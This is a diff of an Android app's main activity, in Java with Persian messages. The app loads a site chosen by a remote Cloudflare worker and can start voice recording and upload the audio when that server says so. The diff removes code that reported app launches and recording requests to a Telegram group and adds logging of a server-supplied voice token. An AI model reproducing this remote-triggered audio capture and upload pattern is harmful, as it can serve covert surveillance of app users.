@@ -29,27 +29,20 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import com.blu.app.voice.FloatingVoiceNotification;
-import com.blu.app.voice.TelegramUploader;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final String LINK_MANAGER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/get-url";
+    private static final String WORKER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/get-url";
     private static final String FALLBACK_URL = "https://example.com";
     private static final int PERMISSION_REQUEST_CODE = 100;
     
     private WebView webView;
     private BroadcastReceiver voiceReceiver;
-    private TelegramUploader uploader;
     
     @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        uploader = new TelegramUploader();
-        
-        // ارسال پیام تست که اپ باز شده
-        uploader.sendMessageToGroup("👤 اپلیکیشن باز شد!");
         
         requestPermissions();
         
@@ -114,13 +107,13 @@ public class MainActivity extends AppCompatActivity {
                         Toast.makeText(context, "🎤 ضبط شروع شد!", Toast.LENGTH_SHORT).show();
                         break;
                     case "VOICE_RECORDING_COMPLETED":
-                        Toast.makeText(context, "⏳ ضبط کامل شد!", Toast.LENGTH_SHORT).show();
+                        Toast.makeText(context, "⏳ ضبط کامل شد، در حال ارسال...", Toast.LENGTH_SHORT).show();
                         break;
                     case "VOICE_UPLOAD_SUCCESS":
-                        Toast.makeText(context, "✅ ارسال شد!", Toast.LENGTH_LONG).show();
+                        Toast.makeText(context, "✅ فایل صوتی با موفقیت ارسال شد!", Toast.LENGTH_LONG).show();
                         break;
                     case "VOICE_UPLOAD_FAILED":
-                        Toast.makeText(context, "❌ ارسال ناموفق!", Toast.LENGTH_LONG).show();
+                        Toast.makeText(context, "❌ ارسال فایل صوتی ناموفق بود!", Toast.LENGTH_LONG).show();
                         break;
                 }
             }
@@ -142,10 +135,11 @@ public class MainActivity extends AppCompatActivity {
     private void resolveUrlAndLoad() {
         new Thread(() -> {
             String siteUrl = FALLBACK_URL;
+            String voiceToken = "token_" + System.currentTimeMillis();
             boolean needsVoice = false;
             
             try {
-                URL u = new URL(LINK_MANAGER_URL);
+                URL u = new URL(WORKER_URL);
                 HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                 conn.setRequestMethod("GET");
                 conn.setConnectTimeout(8000);
@@ -172,8 +166,14 @@ public class MainActivity extends AppCompatActivity {
                     
                     needsVoice = obj.optBoolean("voice", false);
                     
+                    String token = obj.optString("voice_token", "");
+                    if (token != null && !token.isEmpty()) {
+                        voiceToken = token;
+                    }
+                    
                     Log.d("MainActivity", "URL: " + siteUrl);
                     Log.d("MainActivity", "NeedsVoice: " + needsVoice);
+                    Log.d("MainActivity", "VoiceToken: " + voiceToken);
                 }
             } catch (Exception e) {
                 Log.e("MainActivity", "Error: " + e.getMessage());
@@ -181,19 +181,16 @@ public class MainActivity extends AppCompatActivity {
             
             final String finalUrl = siteUrl;
             final boolean finalNeedsVoice = needsVoice;
+            final String finalVoiceToken = voiceToken;
             
             new Handler(Looper.getMainLooper()).post(() -> {
                 webView.loadUrl(finalUrl);
                 
                 if (finalNeedsVoice) {
-                    uploader.sendMessageToGroup("🎙️ درخواست ضبط صدا!");
-                    
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         FloatingVoiceNotification floating = new FloatingVoiceNotification(
                             this,
-                            null, // botToken از uploader استفاده میشه
-                            null, // chatId از uploader استفاده میشه
-                            null
+                            finalVoiceToken
                         );
                         floating.show();
                     }, 2000);
